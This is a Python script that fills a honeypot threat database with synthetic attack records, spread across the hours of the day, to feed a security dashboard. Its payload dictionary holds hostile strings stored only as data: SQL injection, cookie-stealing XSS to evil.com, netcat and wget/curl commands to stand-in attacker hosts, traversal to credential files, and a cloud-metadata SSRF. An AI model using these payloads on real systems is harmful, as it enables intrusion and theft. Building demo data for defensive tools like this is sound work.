#!/usr/bin/env python3
"""
Generador AVANZADO de amenazas demo para NÉMESIS IA
Crea patrones realistas de ataque distribuidos en el tiempo
"""
import sys
sys.path.insert(0, 'src')
import asyncio
from datetime import datetime, timedelta
import random

async def generate_advanced_threats():
    print("=" * 80)
    print("🎯 GENERADOR AVANZADO DE AMENAZAS DEMO - NÉMESIS IA")
    print("=" * 80)
    print()
    
    from database.threat_database import ThreatDatabase, ThreatRecord
    
    # Inicializar base de datos
    db = ThreatDatabase("data/nemesis_honeypot.db")
    
    print("✅ Base de datos conectada")
    print()
    
    # Patrones de ataque realistas por hora
    attack_patterns = {
        # Madrugada (00:00 - 06:00) - Bots y scanners automáticos
        'night': {
            'hours': range(0, 6),
            'types': ['PORT_SCAN', 'BRUTE_FORCE', 'DIRECTORY_TRAVERSAL'],
            'ips': ['45.142.212.61', '185.220.101.3', '91.219.236.232'],
            'intensity': 'low'  # 2-3 ataques por hora
        },
        # Mañana (06:00 - 12:00) - Inicio de actividad humana
        'morning': {
            'hours': range(6, 12),
            'types': ['SQL_INJECTION', 'XSS', 'CSRF'],
            'ips': ['203.0.113.50', '198.51.100.42', '192.0.2.100'],
            'intensity': 'medium'  # 3-5 ataques por hora
        },
        # Tarde (12:00 - 18:00) - Pico de actividad
        'afternoon': {
            'hours': range(12, 18),
            'types': ['COMMAND_INJECTION', 'XXE', 'SSRF', 'PATH_TRAVERSAL'],
            'ips': ['167.99.173.45', '159.65.94.183', '104.131.191.2'],
            'intensity': 'high'  # 5-8 ataques por hora
        },
        # Noche (18:00 - 24:00) - Actividad moderada
        'evening': {
            'hours': range(18, 24),
            'types': ['RCE', 'FILE_UPLOAD', 'LDAP_INJECTION'],
            'ips': ['89.248.172.16', '192.42.116.15', '45.33.32.156'],
            'intensity': 'medium'  # 3-5 ataques por hora
        }
    }
    
    # Payloads específicos por tipo de ataque
    payloads = {
        'SQL_INJECTION': [
            "' OR '1'='1'--",
            "' UNION SELECT password FROM users--",
            "'; DROP TABLE users--",
            "admin' OR 1=1--",
            "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
        ],
        'XSS': [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=fetch('evil.com'+document.cookie)>",
            "<svg onload=alert('XSS')>",
            "javascript:alert(document.domain)",
            "<iframe src=javascript:alert('XSS')>"
        ],
        'COMMAND_INJECTION': [
            "; cat /etc/passwd",
            "| nc attacker.com 4444",
            "; wget http://evil.com/shell.sh",
            "& whoami",
            "; curl http://attacker.com/$(whoami)"
        ],
        'PORT_SCAN': [
            "SYN scan port 22",
            "SYN scan port 80",
            "SYN scan port 443",
            "SYN scan port 3306",
            "SYN scan port 8080"
        ],
        'BRUTE_FORCE': [
            "user=admin pass=admin123",
            "user=root pass=password",
            "user=admin pass=12345678",
            "user=administrator pass=admin",
            "user=admin pass=letmein"
        ],
        'PATH_TRAVERSAL': [
            "../../../../etc/passwd",
            "../../../windows/system32/config/sam",
            "../../../../../../etc/shadow",
            "../../../var/log/apache2/access.log",
            "../../../../proc/self/environ"
        ],
        'RCE': [
            "eval($_POST['cmd'])",
            "system('id')",
            "exec('/bin/bash -c ...')",
            "shell_exec('cat /etc/passwd')",
            "passthru('whoami')"
        ],
        'XXE': [
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>",
            "<!ENTITY % xxe SYSTEM 'file:///c:/windows/win.ini'>",
        ],
        'CSRF': [
            "<img src='http://bank.com/transfer?to=attacker&amount=1000'>",
            "<form action='http://victim.com/delete' method='POST'>",
        ],
        'FILE_UPLOAD': [
            "shell.php.jpg",
            "backdoor.php%00.png",
            "webshell.phtml",
        ],
        'SSRF': [
            "url=http://localhost:8080/admin",
            "fetch=file:///etc/passwd",
            "url=http://169.254.169.254/latest/meta-data/",
        ],
        'LDAP_INJECTION': [
            "admin)(|(password=*))",
            "*))(uid=*))(|(uid=*",
        ],
        'DIRECTORY_TRAVERSAL': [
            "GET /.git/config",
            "GET /.env",
            "GET /admin/config.php",
        ]
    }
    
    threats_generated = []
    base_time = datetime.now() - timedelta(hours=12)  # Últimas 12 horas
    
    print("🎯 Generando amenazas con patrones realistas de horario...")
    print()
    
    total_threats = 0
    
    for period_name, period_data in attack_patterns.items():
        hours = period_data['hours']
        types = period_data['types']
        ips = period_data['ips']
        intensity = period_data['intensity']
        
        # Determinar cantidad de ataques según intensidad
        if intensity == 'low':
            attacks_per_hour = random.randint(2, 3)
        elif intensity == 'medium':
            attacks_per_hour = random.randint(3, 5)
        else:  # high
            attacks_per_hour = random.randint(5, 8)
        
        print(f"⏰ {period_name.upper()}: {list(hours)[0]:02d}:00 - {list(hours)[-1]:02d}:59")
        print(f"   Intensidad: {intensity.upper()} ({attacks_per_hour} ataques/hora)")
        print(f"   Tipos: {', '.join(types)}")
        print()
        
        for hour in hours:
            for _ in range(attacks_per_hour):
                attack_type = random.choice(types)
                ip = random.choice(ips)
                
                # Obtener payload específico o genérico
                if attack_type in payloads:
                    payload = random.choice(payloads[attack_type])
                else:
                    payload = f"Malicious payload for {attack_type}"
                
                # Timestamp aleatorio dentro de la hora
                minute = random.randint(0, 59)
                second = random.randint(0, 59)
                timestamp = base_time + timedelta(hours=hour, minutes=minute, seconds=second)
                
                # Confianza variable (70-95%)
                confidence = random.uniform(0.70, 0.95)
                
                try:
                    threat = ThreatRecord(
                        id=None,
                        timestamp=timestamp,
                        source_ip=ip,
                        attack_type=attack_type,
                        payload=payload,
                        confidence=confidence,
                        action_taken='BLOCK',
                        blocked=True
                    )
                    
                    threat_id = db.save_threat(threat)
                    threats_generated.append({
                        'id': threat_id,
                        'time': timestamp.strftime("%H:%M:%S"),
                        'ip': ip,
                        'type': attack_type,
                        'confidence': confidence
                    })
                    total_threats += 1
                    
                except Exception as e:
                    print(f"❌ Error guardando amenaza: {e}")
    
    print()
    print("=" * 80)
    print(f"📊 RESUMEN DE GENERACIÓN:")
    print("=" * 80)
    print(f"   Total amenazas generadas: {total_threats}")
    print()
    
    # Estadísticas por tipo
    from collections import Counter
    types_count = Counter(t['type'] for t in threats_generated)
    
    print("📈 Amenazas por tipo:")
    for attack_type, count in types_count.most_common():
        print(f"   • {attack_type:25s}: {count:3d} ataques")
    
    print()
    
    # Estadísticas por IP
    ips_count = Counter(t['ip'] for t in threats_generated)
    print("🌐 Top 5 IPs atacantes:")
    for ip, count in ips_count.most_common(5):
        print(f"   • {ip:20s}: {count:3d} ataques")
    
    print()
    
    # Verificación en BD
    stats = db.get_statistics()
    print("=" * 80)
    print("✅ VERIFICACIÓN DE BASE DE DATOS:")
    print("=" * 80)
    print(f"   Total threats en BD: {stats['total_threats']}")
    print(f"   Últimas 24h: {stats['threats_last_24h']}")
    print(f"   IPs bloqueadas: {stats['total_blocked_ips']}")
    print()
    
    # Mostrar distribución horaria
    from collections import defaultdict
    hourly_dist = defaultdict(int)
    for t in threats_generated:
        hour = int(t['time'].split(':')[0])
        hourly_dist[hour] += 1
    
    print("⏰ Distribución horaria (últimas 12 horas):")
    for hour in sorted(hourly_dist.keys()):
        bar = '█' * hourly_dist[hour]
        print(f"   {hour:02d}:00 | {bar} ({hourly_dist[hour]})")
    
    print()
    print("=" * 80)
    print("✅ AMENAZAS GENERADAS EXITOSAMENTE")
    print()
    print("📋 SIGUIENTE PASO:")
    print("   1. Reinicia el dashboard: python test_dashboard_unified.py")
    print("   2. Refresca el navegador (F5)")
    print("   3. Verás el Threat Timeline con datos realistas distribuidos")
    print("=" * 80)

if __name__ == "__main__":
    asyncio.run(generate_advanced_threats())